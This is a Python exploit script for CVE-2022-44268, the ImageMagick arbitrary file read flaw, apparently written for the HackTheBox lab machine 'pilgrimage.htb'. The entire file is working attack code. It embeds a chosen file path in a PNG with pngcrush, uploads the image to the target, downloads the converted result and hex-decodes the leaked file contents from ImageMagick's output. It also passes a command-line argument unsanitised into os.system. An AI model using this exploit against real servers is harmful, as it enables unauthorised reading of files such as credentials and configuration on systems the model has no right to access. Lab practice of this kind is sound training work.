import requests
import argparse
import subprocess,os

# Expoit for CVE-2022-44268
# Edit mal_file variable to `pwd`/pngout.png
# Edit cmd to vulnerable `magick` installation path

parser = argparse.ArgumentParser()
parser.add_argument('-f','--file',help='file to download')
parser.add_argument('-i','--image',help='png image to use for the exploit')
args = parser.parse_args()

proxy = {'http':'http://127.0.0.1:8080'}

url = "http://pilgrimage.htb/"

# using pngcrush to generate malicious image
print(f'\r\n[+] File to include: {args.file}\r\n')
print(f'\r\n[+] Running pngcrush command:\r\n')
os.system(f"pngcrush -text a 'profile' {args.file} {args.image}")
mal_file = "/home/deathstalker/walkthrough/hackthebox/pilgrimage/poc/pngout.png"

# uploading the malicious image to the server
print('\r\n[+] Uploading malicious image\r\n')
files = {'toConvert': open(f'{mal_file}','rb')}
#response = requests.post(url,files=files, proxies=proxy, allow_redirects = False)
response = requests.post(url,files=files, allow_redirects = False)

# extracting the url of the uploaded image
message = response.headers['Location']
image_url = message.split('=')[1].split('&')[0]


# downloading the image
print(f'\r\n[+] IMAGE URL: {image_url}')
image = requests.get(image_url)
with open("image.png", "wb") as f:
    f.write(image.content)

# running the magick identify command on the downloaded image
cmd = ['/home/deathstalker/walkthrough/hackthebox/pilgrimage/poc/magick','identify','-verbose','image.png']
with open('output.txt', 'w') as out:
    return_code = subprocess.call(cmd, stdout=out)

#extracting encoded data from the output file
with open("output.txt","rb") as f:
    log_data = f.read()

start_marker = b"Raw profile type:"
end_marker = b"signature:"

start_index = log_data.find(start_marker)
end_index = log_data.find(end_marker)

if start_index != -1 and end_index != -1:
    blob = log_data[start_index + len(start_marker):end_index].strip()
else:
    print("Blob not found in the log file.")

# extracting encoded data from the blob
list = blob.split(b'\n')[1:]
enc_data = b"\n".join(list)
print('\r\n-------------------- OUTPUT -----------------------------\r\n')

#decoded lfi output
print(bytes.fromhex((enc_data).decode("utf-8")).decode("utf-8"))
print('\r\n---------------------------------------------------------\r\n')

# References: https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC